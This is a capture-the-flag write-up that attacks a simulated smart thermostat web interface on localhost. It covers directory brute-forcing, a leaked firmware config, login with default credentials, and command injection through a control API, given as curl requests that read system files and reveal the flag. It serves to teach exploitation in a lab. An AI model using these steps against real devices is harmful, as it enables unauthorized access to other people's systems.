🧭 Overview

We are tasked with auditing an IP address hosting a Smart Thermostat (IoT) web interface. The challenge involves identifying exposed endpoints, bypassing authentication, and escalating to Remote Command Execution (RCE) to retrieve the flag.

🔍 Step 1: Initial Reconnaissance

Visiting the application reveals a dashboard that periodically refreshes temperature values.

To see what's hidden under the hood, I performed directory brute-forcing:

gobuster dir -u http://localhost:5000/ -w /usr/share/wordlists/dirb/common.txt -x txt,php,html

Result: /firmware (Status: 200). This is usually where the "good stuff" is hidden in IoT targets.

📦 Step 2: Firmware & API Discovery

Accessing the firmware endpoint reveals a configuration leak:

SMARTTHERM FIRMWARE v1.0 debug=true api_endpoint=/api/control note=remove debug before production

🧠 Key Insights: debug=true is enabled, and we have the path to a control API. Checking the /api directory manually gave us the full map:

  • /api/status (200 OK)
  • /api/login (405 Method Not Allowed - requires POST)
  • /api/control (405 Method Not Allowed - requires POST)

📡 Step 3: Information Disclosure

The /api/status endpoint provides internal device info without authentication:

curl http://localhost:5000/api/status # { "device": "SmartTherm v1", "status": "online", "temperature": 22 }

🔐 Step 4: Authentication Bypass (The Default Creds)

Following a classic IoT vulnerability pattern, I tested for hardcoded "admin/admin123" credentials at the login endpoint:

curl -X POST http://localhost:5000/api/login \ -H "Content-Type: application/json" \ -d '{"username":"admin","password":"admin123"}' # Output: {"token":"iot-token-guest"}

We received an Authorization Token. Curiously, it’s labeled as iot-token-guest, suggesting our level of access might be limited—or so the developers thought.

⚙️ Step 5: Exploiting the Control API (RCE)

With the token in hand, I targeted /api/control. Note the custom header format: the server expects Authorization: [token] rather than the standard Bearer format.

Testing for Command Injection in the "cmd" parameter:

curl -X POST http://localhost:5000/api/control \ -H "Authorization: iot-token-guest" \ -H "Content-Type: application/json" \ -d '{"cmd":"ls /etc"}'

Output: device.conf, passwd, shadow. We have full Remote Command Execution!

🧪 Step 6: System Enumeration & Flag Capture

Now that I had a shell-like interface, I checked the device configuration and web root:

# Command: cat /etc/device.conf DEVICE=SmartTherm v1 | OS=Embedded Linux | WEBROOT=/var/www # Command: ls /var/www device.py

The core logic of the application resides in device.py. Reading this file reveals the hardcoded flag used for the dashboard's internal checks:

# Command: cat /var/www/device.py FLAG = "t3rmctf{d0nt_r41s3_0r_dr0p_t3mp}"
